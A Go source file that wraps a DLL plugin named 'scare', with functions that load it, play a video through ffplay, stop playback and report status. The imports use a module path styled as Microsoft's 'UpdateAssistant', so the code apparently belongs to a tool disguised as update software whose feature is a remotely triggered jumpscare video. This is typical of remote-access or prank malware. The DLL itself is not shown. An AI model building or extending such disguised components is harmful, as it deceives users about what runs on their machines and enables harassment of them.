package sysutil

import (
	"sync"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	scarePlugin   *loader.Plugin
	scarePluginMu sync.Mutex
)

func scareLoad() *loader.Plugin {
	scarePluginMu.Lock()
	if scarePlugin != nil {
		return scarePlugin
	}
	p, err := loader.Load("scare")
	if err != nil {
		logger.Error("scare: DLL load failed: %v", err)
		scarePluginMu.Unlock()
		return nil
	}
	scarePlugin = p
	logger.Info("scare: DLL loaded")
	return scarePlugin
}

func scareUnlock() {
	scarePluginMu.Unlock()
}

func ScarePlay(videoPath string, ffplayPath string) int {
	p := scareLoad()
	if p == nil {
		return -1
	}
	defer scareUnlock()
	n, err := p.Call("scare_play",
		uintptr(unsafe.Pointer(loader.BytePtr(videoPath))),
		uintptr(unsafe.Pointer(loader.BytePtr(ffplayPath))))
	if err != nil {
		logger.Error("scare: scare_play failed: %v", err)
		return -1
	}
	logger.Info("scare: scare_play returned %d", int(n))
	return int(n)
}

func ScareStop() int {
	scarePluginMu.Lock()
	p := scarePlugin
	scarePluginMu.Unlock()
	if p == nil {
		return 0
	}
	n, err := p.Call("scare_stop")
	if err != nil {
		logger.Error("scare: scare_stop failed: %v", err)
		return 0
	}
	logger.Info("scare: scare_stop returned %d", int(n))
	scarePluginMu.Lock()
	if scarePlugin != nil {
		loader.Unload(scarePlugin)
		scarePlugin = nil
		logger.Info("scare: DLL unloaded")
	}
	scarePluginMu.Unlock()
	return int(n)
}

func ScareStatus() bool {
	scarePluginMu.Lock()
	p := scarePlugin
	scarePluginMu.Unlock()
	if p == nil {
		return false
	}
	n, err := p.Call("scare_status")
	if err != nil {
		logger.Error("scare: scare_status failed: %v", err)
		return false
	}
	return int(n) == 1
}
